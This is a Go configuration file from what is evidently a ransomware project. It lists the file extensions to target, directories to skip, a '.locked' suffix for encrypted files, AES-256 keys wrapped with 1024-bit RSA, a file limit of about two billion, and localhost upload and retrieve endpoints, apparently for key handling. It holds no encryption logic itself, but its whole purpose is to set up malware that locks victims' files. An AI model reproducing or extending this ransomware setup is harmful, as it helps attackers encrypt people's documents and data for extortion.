package config

var Extensions = [...]string{
	"txt",
	"doc",
	"docx",
	"xls",
	"xlsx",
	"ppt",
	"pptx",
	"odt",
	"jpg",
	"png",
	"csv",
	"sql",
	"md",
	"c",
	"php",
	"asp",
	"aspx",
	"html",
	"xml",
	"go",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	"AppData",
	".",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = ".locked"

	// ProcessMax X files, then stop
	ProcessMax int32 = 2147483647

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (higher = exponentially slower)
	Bits int = 1024

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	UploadEndpoint = "http://localhost:8080/upload"

	RetrieveEndpoint = "http://localhost:8080/retrieve"

	TCPEndpoint = "http://localhost:8080/retrieve"
	// TODO: use viper.
)
